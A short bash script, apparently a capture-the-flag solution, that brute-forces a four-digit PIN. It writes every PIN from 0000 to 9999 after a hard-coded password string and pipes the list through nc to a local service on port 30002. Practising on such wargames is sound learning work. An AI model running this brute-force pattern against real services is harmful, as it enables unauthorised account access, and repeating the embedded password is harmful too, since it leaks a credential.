#!/bin/bash

n=1
wordlist=passlist

echo -e "Creating wordlist, to make this work be fast.\n"

for i1 in {0..9}; do
    for i2 in {0..9}; do
        for i3 in {0..9}; do
            for i4 in {0..9}; do
                echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ' $i1$i2$i3$i4 >> $wordlist
            done
        done
    done
done

head -n 5 $wordlist
echo -e "\n"
echo -e "Done creating wordlist, ready to bruteforce.\n"
cat $wordlist | nc localhost 30002

rm $wordlist
